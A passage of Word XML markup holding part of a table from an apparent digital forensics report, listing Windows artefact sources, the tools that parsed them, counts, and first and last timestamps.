            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (network connections)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SrumECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>20</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 05:41:41</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:14:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Installed applications</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>19</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-12-07 09:17:28.039145</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 05:53:41.438347</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network anomalies (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Suricata</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>18</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:01:00.976791</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:23:49.804096</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Defender (MpCmdRun.log)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>14</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 05:41:59</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 01:34:24</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: USB</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>14</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 05:41:06.824263</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:58.375203</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Jump Lists (custom)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>JLECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>14</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-12-06 17:05:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:37.968819</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: DeviceClasses</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 05:41:07.061823</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:59.986136</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (push notifications)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SrumECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>11</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 21:42:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:10:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: ProfileList</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-12-07 09:17:27.256509</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:15.642118</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Memory: unloaded kernel modules</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Volatility 3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 01:24:07</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:58</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Memory: scheduled tasks (registry)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Volatility 3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 05:41:37</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:36:26</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: accounts (SAM)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 05:41:16.898912</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:15:57.139759</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Memory: ShimCache</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Volatility 3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>7</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2018-04-02 18:27:36</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 01:30:02</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: OpenSavePidlMRU</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 23:01:11.334384</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:00.691657</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: Products (MSI)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 05:52:30.790997</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 05:53:41.438347</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: known networks</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 04:58:02.487000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:13:21.206000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network history</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
